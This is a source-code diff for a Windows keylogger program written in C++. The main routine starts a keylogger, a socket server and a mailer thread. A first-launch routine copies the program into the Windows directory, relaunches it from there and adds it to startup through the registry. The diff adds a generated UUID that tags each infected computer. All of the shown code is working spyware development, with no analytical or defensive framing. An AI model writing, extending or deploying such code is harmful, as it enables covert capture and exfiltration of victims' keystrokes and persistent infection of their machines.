@@ -6,6 +6,8 @@
 #include "helpers/ComputerInfoHelper.h"
 #include "services/EmailService.h"
 #include "helpers/Configuration.h"
+#include "helpers/AppData.h"
+#include <rpc.h>
 
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
@@ -23,6 +25,7 @@ void mailerThreadProc();
 bool addToStartup(std::wstring pszAppName, std::wstring pathToExe);
 bool makeFirstLaunch();
 void sendFirstEmail();
+void initAppData();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
@@ -54,10 +57,12 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	wndClass.lpszClassName = L"window";
 	RegisterClass(&wndClass);
 
+	Configuration::InitConfiguration();
+
 	logger = make_shared<Keylogger>();
 	logger->start();
 
-	socketServer = make_shared<SocketServer>(logger.get());
+	socketServer = make_shared<SocketServer>();
 	std::thread socketThread(socketThreadProc);
 	std::thread mailerThread(mailerThreadProc);
 	while (GetMessage(&msg, NULL, 0, 0)) {
@@ -106,6 +111,17 @@ void mailerThreadProc() {
 	}
 }
 
+void initAppData() {
+	// Generate UUID for computer
+	UUID uuid;
+	UuidCreate(&uuid);
+	char *str;
+	UuidToStringA(&uuid, (RPC_CSTR*)&str);
+
+	AppData::getInstance().ComputerId = StringHelper::s2ws(str);
+	AppData::getInstance().save();
+}
+
 bool addToStartup(std::wstring pszAppName, std::wstring pathToExe) {
 	HKEY hkey = NULL;
 	int result = 0;
@@ -140,13 +156,15 @@ bool makeFirstLaunch() {
 	std::wstring winDir = std::wstring(buff);
 	if (StringHelper::toLower(path).find(StringHelper::toLower(winDir)) != 0) {
 		// Copy self to windir
-		std::wstring newPath = Configuration::GetProgramPath();
+		std::wstring newPath = Configuration::ProgramPath;
 		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
 		if (result) {
 			std::wcout << L"copied";
 		} else {
 			std::wcout << L"err";
 		}
+
+		initAppData();
 
 		// Create new process of program in windir
 		STARTUPINFO si;
@@ -158,7 +176,7 @@ bool makeFirstLaunch() {
 
 		CreateProcess(newPath.c_str(), NULL, NULL, NULL,
 			NULL, NULL, NULL, NULL, &si, &pi);
-		addToStartup(Configuration::GetProgramName(), newPath);
+		addToStartup(Configuration::ProgramFilename, newPath);
 		return true;
 	} else {
 		return false;
